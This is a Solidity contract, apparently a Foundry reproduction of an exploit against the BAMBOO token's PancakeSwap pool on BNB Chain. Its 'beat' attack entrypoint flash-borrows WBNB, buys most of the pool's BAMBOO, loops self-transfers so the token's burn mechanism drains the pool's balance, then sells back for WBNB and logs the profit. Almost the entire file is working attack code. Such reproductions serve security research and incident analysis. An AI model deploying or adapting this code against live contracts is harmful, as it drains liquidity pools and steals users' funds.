import {RuinLocation} from "./ruins/RuinLocation.sol";

import {
    BSC_USD as USDT,
    WBNB,
    PANCAKE_ROUTER
} from "../../constants/bsc.sol";

import {IERC20} from "../../interfaces/tokens/IERC20.sol";
import {IPancakeRouter} from "../../interfaces/dex/pancakeswap/IPancakeRouter.sol";
import {IPancakePair} from "../../interfaces/dex/pancakeswap/IPancakePair.sol";

import {BscDppSingleFlashloanHelper} from "../../lib/flashloan/dodo/BscDppFlashloanHelper.sol";

import "forge-std/console.sol";

contract Shaman is BscDppSingleFlashloanHelper, RuinLocation {

    function peek() external {
        uint r0_wbnb;
        uint r1_bamboo;
        (r0_wbnb, r1_bamboo, ) = IPancakePair(PANCAKE_BAMBOO_WBNB_PAIR).getReserves();
        console.log("[Status] Reserve in PANCAKE_BAMBOO_WBNB_PAIR: r0_wbnb = %s, r1_bamboo = %s", r0_wbnb, r1_bamboo);
    }

    // attack entrypoint
    // step 1: borrow WBNB using flash loan
    // step 2: swap WBNB for BAMBOO
    // step 3: transfer self to burn the BAMBOO in the pool
    // step 4: swap BAMBOO for WBNB
    function beat() external {
        borrow(WBNB, type(uint).max);
        // _flashloanWBNB(DPPORACLE);
        console.log("[>*BOOM*<] Profit = %s WBNB", IERC20(WBNB).balanceOf(address(this)));
    }
    function _flashloanLogic(bytes calldata data) internal override {
        IERC20(WBNB).approve(PANCAKE_ROUTER, type(uint).max);
        address[] memory _path = new address[](2);
        _path[0] = WBNB;
        _path[1] = BAMBOO;            
        IPancakeRouter(payable(PANCAKE_ROUTER)).swapTokensForExactTokens(
            IERC20(BAMBOO).balanceOf(PANCAKE_BAMBOO_WBNB_PAIR) * 90 / 100, 
            IERC20(WBNB).balanceOf(address(this)), 
            _path, 
            address(this), 
            block.timestamp
        );

        _path[0] = BAMBOO;
        _path[1] = WBNB;
        uint _wbnbAmt = IERC20(WBNB).balanceOf(PANCAKE_BAMBOO_WBNB_PAIR);
        while(true){
            IERC20(BAMBOO).transfer(
                address(this), 
                IERC20(BAMBOO).balanceOf(PANCAKE_BAMBOO_WBNB_PAIR) - 1    
            );
            uint[] memory _amounts = IPancakeRouter(payable(PANCAKE_ROUTER)).getAmountsOut(
                IERC20(BAMBOO).balanceOf(address(this)),
                _path
            );

            if (_amounts[1] > _wbnbAmt * 9999 / 10000) {
                break;
            }
        }
        IERC20(BAMBOO).approve(PANCAKE_ROUTER, type(uint).max);

        IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(BAMBOO).balanceOf(address(this)), 
            0, 
            _path, 
            address(this), 
            block.timestamp
        );
    }
}